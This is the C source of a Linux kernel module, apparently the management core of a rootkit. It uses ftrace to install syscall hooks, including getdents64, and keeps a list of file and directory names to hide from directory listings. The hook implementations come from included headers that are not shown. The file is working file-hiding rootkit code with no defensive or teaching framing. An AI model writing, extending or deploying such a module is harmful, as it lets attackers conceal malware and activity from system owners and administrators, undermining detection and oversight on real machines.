/*
 * hook_manager.c - Hook 核心管理器
 * 使用 Ftrace 框架
 */

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>

#include "hook.h"
#include "ftrace_helper.h"
#include "hooks_getdents64.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HOOK");
MODULE_DESCRIPTION("File Hiding Module");
MODULE_VERSION("1.0");

/* Hidden file/folder storage */
static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
static int hidden_count = 0;
static DEFINE_SPINLOCK(hidden_lock);

int add_hidden_file(const char *name, bool is_dir)
{
    unsigned long flags;
    int i;

    if (!name || strlen(name) >= sizeof(hidden_files[0].name))
        return -EINVAL;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++) {
        if (hidden_files[i].active &&
            strcmp(hidden_files[i].name, name) == 0 &&
            hidden_files[i].is_dir == is_dir) {
            spin_unlock_irqrestore(&hidden_lock, flags);
            return 0;
        }
    }

    if (hidden_count >= MAX_HIDDEN_FILES) {
        spin_unlock_irqrestore(&hidden_lock, flags);
        return -ENOSPC;
    }

    strcpy(hidden_files[hidden_count].name, name);
    hidden_files[hidden_count].is_dir = is_dir;
    hidden_files[hidden_count].active = true;
    hidden_count++;

    spin_unlock_irqrestore(&hidden_lock, flags);
    pr_info("hook: added hidden %s: %s\n", is_dir ? "dir" : "file", name);
    return 0;
}

int remove_hidden_file(const char *name)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++) {
        if (hidden_files[i].active &&
            strcmp(hidden_files[i].name, name) == 0) {
            hidden_files[i].active = false;
            spin_unlock_irqrestore(&hidden_lock, flags);
            pr_info("hook: removed hidden: %s\n", name);
            return 0;
        }
    }

    spin_unlock_irqrestore(&hidden_lock, flags);
    return -ENOENT;
}

bool is_hidden(const char *name, bool is_dir)
{
    unsigned long flags;
    bool found = false;
    int i;

    if (!name)
        return false;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++) {
        if (hidden_files[i].active &&
            hidden_files[i].is_dir == is_dir &&
            strcmp(hidden_files[i].name, name) == 0) {
            found = true;
            break;
        }
    }

    spin_unlock_irqrestore(&hidden_lock, flags);
    return found;
}

void clear_hidden_list(void)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++)
        hidden_files[i].active = false;
    hidden_count = 0;

    spin_unlock_irqrestore(&hidden_lock, flags);
    pr_info("hook: hidden list cleared\n");
}

static int __init hook_init(void)
{
    int err;

    err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
    if (err) {
        pr_err("hook: failed to install hooks: %d\n", err);
        return err;
    }

    pr_info("hook: module initialized\n");
    return 0;
}

static void __exit hook_exit(void)
{
    fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
    clear_hidden_list();
    pr_info("hook: module exited\n");
}

module_init(hook_init);
module_exit(hook_exit);
